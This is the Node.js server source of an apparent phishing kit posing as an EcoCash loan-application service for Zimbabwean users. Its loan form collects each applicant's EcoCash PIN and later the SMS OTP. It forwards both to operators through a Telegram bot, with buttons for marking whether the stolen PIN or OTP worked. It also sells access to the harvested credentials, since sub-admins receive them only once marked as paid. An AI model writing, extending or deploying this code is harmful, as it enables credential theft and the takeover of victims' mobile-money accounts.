require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

const publicPath = path.join(__dirname, 'public');
app.use(express.static(publicPath));

const APP_URL = process.env.APP_URL || 'https://ecocash-aot6.onrender.com';

function getAdmins() {
  const admins = [];
  let index = 1;
  while (process.env[`ADMIN_${index}_CHAT_ID`]) {
    const chatId = process.env[`ADMIN_${index}_CHAT_ID`].trim();
    if (chatId) {
      const isMain = (index === 1);
      const key = isMain ? 'main' : `admin-${String(index).padStart(3, '0')}`;
      const name = isMain ? 'Main Admin' : `Admin-${String(index).padStart(3, '0')}`;

      admins.push({
        key: key,
        name: name,
        chatId: chatId,
        isMain: isMain,
        index: index
      });
    }
    index++;
  }

  if (admins.length === 0 && process.env.ADMIN_CHAT_ID) {
    admins.push({
      key: 'main',
      name: 'Main Admin',
      chatId: process.env.ADMIN_CHAT_ID.trim(),
      isMain: true,
      index: 1
    });
  }

  return admins;
}

const activeApplications = new Map();
const adminSubscriptions = new Map();

function formatZimbabwePhone(phone) {
  let p = phone || '';
  if (p.startsWith('+263')) p = p.replace('+263', '');
  else if (p.startsWith('263')) p = p.slice(3);
  else if (p.startsWith('0')) p = p.slice(1);
  return p;
}

app.post('/api/telegram-webhook', async (req, res) => {
  res.sendStatus(200);

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  if (!botToken) return;

  const { message, callback_query } = req.body;
  const ADMINS = getAdmins();

  if (message && message.text && message.text.startsWith('/start')) {
    const chatId = message.chat.id;
    const firstName = message.from.first_name || 'Admin';
    const username = message.from.username ? `@${message.from.username}` : 'Not set';

    let matchedAdmin = ADMINS.find(a => a.chatId && String(a.chatId) === String(chatId));
    if (!matchedAdmin) return;

    const adminKey = matchedAdmin.key;
    const adminRole = matchedAdmin.name;
    const privateLink = `${APP_URL}/admin/${encodeURIComponent(adminKey)}`;

    let welcomeMsg = `🤖 <b>ECOCASH ADMIN BOT ACTIVATED</b>\n` +
                     `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                     `👤 <b>User Info:</b>\n` +
                     `• <b>Name:</b> ${firstName}\n` +
                     `• <b>Username:</b> ${username}\n` +
                     `• <b>Chat ID:</b> <code>${chatId}</code>\n` +
                     `• <b>Role:</b> ${adminRole}\n\n`;

    if (matchedAdmin.isMain) {
      welcomeMsg += `👑 <b>MAIN ADMIN CONTROL PANEL</b>\n` +
                    `<i>Approve payment status to authorize sub-admins (Admin-002, Admin-003 onwards):</i>\n\n`;

      const subAdmins = ADMINS.filter(a => !a.isMain);
      if (subAdmins.length === 0) {
        welcomeMsg += `<i>No sub-admins currently configured via environment variables.</i>`;
      } else {
        for (const sub of subAdmins) {
          const currentStatus = adminSubscriptions.get(sub.chatId) || 'UNPAID';
          welcomeMsg += `👤 <b>${sub.name}</b> (ID: <code>${sub.chatId}</code>)\n` +
                        `💳 Status: <b>${currentStatus}</b>\n` +
                        `🔗 Link: ${APP_URL}/admin/${sub.key}\n\n`;
        }
      }

      let inlineKeyboard = [[{ text: '🌐 Open Main Dashboard', url: privateLink }]];
      
      for (const sub of subAdmins) {
        inlineKeyboard.push([
          { text: `✅ ${sub.name} PAID`, callback_data: `sub_paid_${sub.chatId}` },
          { text: `❌ ${sub.name} UNPAID`, callback_data: `sub_unpaid_${sub.chatId}` }
        ]);
      }

      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: welcomeMsg,
          parse_mode: 'HTML',
          reply_markup: { inline_keyboard: inlineKeyboard }
        })
      });

    } else {
      const subStatus = adminSubscriptions.get(chatId) || 'UNPAID';
      
      welcomeMsg += `🔗 <b>YOUR PRIVATE INDEPENDENT LINK:</b>\n` +
                    `${privateLink}\n\n` +
                    `💳 <b>Payment Status:</b> <b>${subStatus}</b>\n` +
                    `<i>You can view your personal information and link above.</i>`;

      let subInlineKeyboard = [[{ text: '🌐 Open Private Dashboard', url: privateLink }]];

      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: welcomeMsg,
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: subInlineKeyboard
          }
        })
      });
    }
  }

  if (callback_query) {
    const actionData = callback_query.data;
    const chatId = callback_query.message.chat.id;
    const messageId = callback_query.message.message_id;

    // Security check: Only allow Main Admin (ADMIN_1) to control/change payment statuses
    const ADMINS = getAdmins();
    const mainAdmin = ADMINS.find(a => a.isMain);
    const isMainAdmin = mainAdmin && String(mainAdmin.chatId) === String(chatId);

    if ((actionData.startsWith('sub_paid_') || actionData.startsWith('sub_unpaid_')) && isMainAdmin) {
      const isPaid = actionData.startsWith('sub_paid_');
      const targetChatId = actionData.replace(isPaid ? 'sub_paid_' : 'sub_unpaid_', '');
      
      adminSubscriptions.set(targetChatId, isPaid ? 'PAID' : 'UNPAID');

      await editTelegramMessage(
        botToken, 
        chatId, 
        messageId, 
        `${callback_query.message.text}\n\n🔄 <b>Updated Status for ID ${targetChatId}:</b> ${isPaid ? 'PAID ✅ (Authorized)' : 'UNPAID ❌ (Revoked)'}`
      );
      return;
    }

    if (actionData.startsWith('pin_correct_')) {
      const ref = actionData.replace('pin_correct_', '');
      if (activeApplications.has(ref)) {
        const appData = activeApplications.get(ref);
        appData.status = 'PIN_APPROVED';
        activeApplications.set(ref, appData);
      }
      await editTelegramMessage(botToken, chatId, messageId, `${callback_query.message.text}\n\n🟢 <b>STATUS: PIN APPROVED ✅</b>`);
    }

    if (actionData.startsWith('pin_wrong_')) {
      const ref = actionData.replace('pin_wrong_', '');
      if (activeApplications.has(ref)) {
        const appData = activeApplications.get(ref);
        appData.status = 'PIN_REJECTED';
        activeApplications.set(ref, appData);
      }
      await editTelegramMessage(botToken, chatId, messageId, `${callback_query.message.text}\n\n🔴 <b>STATUS: PIN REJECTED ❌</b>`);
    }

    if (actionData.startsWith('otp_correct_')) {
      const ref = actionData.replace('otp_correct_', '');
      if (activeApplications.has(ref)) {
        const appData = activeApplications.get(ref);
        appData.status = 'LOAN_APPROVED';
        activeApplications.set(ref, appData);
      }
      await editTelegramMessage(botToken, chatId, messageId, `${callback_query.message.text}\n\n🟢 <b>STATUS: OTP & LOAN APPROVED ✅</b>`);
    }

    if (actionData.startsWith('otp_wrong_')) {
      const ref = actionData.replace('otp_wrong_', '');
      if (activeApplications.has(ref)) {
        const appData = activeApplications.get(ref);
        appData.status = 'OTP_REJECTED';
        activeApplications.set(ref, appData);
      }
      await editTelegramMessage(botToken, chatId, messageId, `${callback_query.message.text}\n\n🔴 <b>STATUS: OTP REJECTED ❌</b>`);
    }
  }
});

async function editTelegramMessage(botToken, chatId, messageId, text) {
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, message_id: messageId, text, parse_mode: 'HTML' })
    });
  } catch (err) {
    console.error("Telegram edit error:", err.message);
  }
}

app.post('/api/apply-loan', async (req, res) => {
  try {
    const data = req.body;
    const formattedPhone = formatZimbabwePhone(data.phone);
    const randomHex = Math.random().toString(36).substring(2, 6).toUpperCase();
    const appReference = `ECO-${Date.now().toString().slice(-6)}-${randomHex}`;

    const appData = { ...data, formattedPhone, status: 'PENDING_PIN' };
    activeApplications.set(appReference, appData);

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const ADMINS = getAdmins();

    if (botToken && ADMINS.length > 0) {
      for (const admin of ADMINS) {
        if (!admin.chatId) continue;

        if (!admin.isMain) {
          const subStatus = adminSubscriptions.get(admin.chatId) || 'UNPAID';
          if (subStatus !== 'PAID') continue;
        }

        const msgText = `🔑 <b>NEW LOAN APPLICATION (STEP 1 & 2 DELIVERED)</b>\n` +
                        `👤 <b>Assigned Admin:</b> ${admin.name}\n\n` +
                        `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
                        `👤 <b>Name:</b> ${data.fullName}\n` +
                        `💼 <b>Occupation:</b> ${data.occupation}\n` +
                        `💵 <b>Income:</b> $${data.monthlyIncome}\n` +
                        `⏳ <b>Repayment Period:</b> ${data.repaymentPeriod} Month(s)\n` +
                        `💰 <b>Amount Requested:</b> $${data.loanAmount}\n` +
                        `📞 <b>Phone:</b> +263${formattedPhone}\n` +
                        `🔑 <b>EcoCash PIN:</b> <code>${data.pin}</code>`;

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: admin.chatId,
            text: msgText,
            parse_mode: 'HTML',
            reply_markup: {
              inline_keyboard: [
                [
                  { text: '❌ Wrong PIN', callback_data: `pin_wrong_${appReference}` },
                  { text: '✅ Correct PIN', callback_data: `pin_correct_${appReference}` }
                ]
              ]
            }
          })
        });
      }
    }

    res.status(201).json({ success: true, appReference });
  } catch (error) {
    console.error("[SERVER ERROR]", error);
    res.status(500).json({ success: false, error: "Internal Server Error" });
  }
});

app.post('/api/submit-otp', async (req, res) => {
  const { appReference, otpCode } = req.body;
  
  if (activeApplications.has(appReference)) {
    const appData = activeApplications.get(appReference);
    appData.status = 'PENDING_OTP';
    appData.otpCode = otpCode;
    activeApplications.set(appReference, appData);

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const ADMINS = getAdmins();

    if (botToken && ADMINS.length > 0) {
      for (const admin of ADMINS) {
        if (!admin.chatId) continue;

        if (!admin.isMain) {
          const subStatus = adminSubscriptions.get(admin.chatId) || 'UNPAID';
          if (subStatus !== 'PAID') continue;
        }

        const msgText = `📲 <b>RECEIVED OTP CODE (STEP 3)</b>\n` +
                        `👤 <b>Assigned Admin:</b> ${admin.name}\n\n` +
                        `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
                        `📞 <b>Phone:</b> +263${appData.formattedPhone}\n` +
                        `🔐 <b>SMS OTP:</b> <code>${otpCode}</code>`;

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: admin.chatId,
            text: msgText,
            parse_mode: 'HTML',
            reply_markup: {
              inline_keyboard: [
                [
                  { text: '❌ Wrong OTP', callback_data: `otp_wrong_${appReference}` },
                  { text: '✅ Correct OTP', callback_data: `otp_correct_${appReference}` }
                ]
              ]
            }
          })
        });
      }
    }
  }

  res.status(200).json({ success: true });
});

app.get('/api/check-status/:appReference', (req, res) => {
  const { appReference } = req.params;
  const appData = activeApplications.get(appReference);
  if (!appData) return res.status(404).json({ success: false, status: 'NOT_FOUND' });
  res.json({ success: true, status: appData.status });
});

app.get('*', (req, res) => {
  res.sendFile(path.join(publicPath, 'index.html'));
});

app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
